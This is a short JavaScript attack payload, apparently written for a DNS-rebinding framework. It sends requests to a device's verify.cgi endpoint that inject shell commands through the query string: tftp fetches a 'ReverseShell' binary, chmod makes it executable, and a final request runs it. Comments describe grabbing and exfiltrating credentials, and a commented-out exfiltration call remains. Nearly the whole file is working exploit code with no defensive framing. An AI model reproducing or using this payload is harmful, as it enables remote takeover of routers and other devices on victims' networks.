//import {DNSRebindNode} from "/share/js/DNSRebindNode.js";

const  payload_attack = async function() {

        try {
            
            // alrighty, now that we've rebinded the host name and are
            // communicating with the target service, let's grab the credentials
            const creds1 = await fetch(`http://${location.host}/users/verify.cgi?tftp -g -r ReverseShell -l /bin/ReverseShell 127.0.0.1 8888 = 5`)
            console.log(creds1)
            const creds2 = await fetch(`http://${location.host}/users/verify.cgi?chmod 777 /bin/ReverseShell = 5`)
            console.log(creds2)
            
            const creds3 = await fetch(`http://${location.host}/users/verify.cgi?ReverseShell = 5`)
            console.log(creds3)

             // {
             //     "username": "crashOverride",
             //     "password": "hacktheplanet!",
             // }
            // console.log(creds)

            // great, now let's exfiltrate those creds to the Node.js server
            // running this whole shebang. That's the last thing we care about,
            // so we will just return this promise as the result of attack()
            // and let its handler's deal with it.
            //
            // NOTE: the second argument to exfiltrate(...) must be JSON
            // serializable.
            // TODO: import DNSRebindNode/pass to the function
 	    //return DNSRebindNode.exfiltrate('auth-example', {'success': true})

        } catch (err) {
            return Promise.reject(err)
        }}
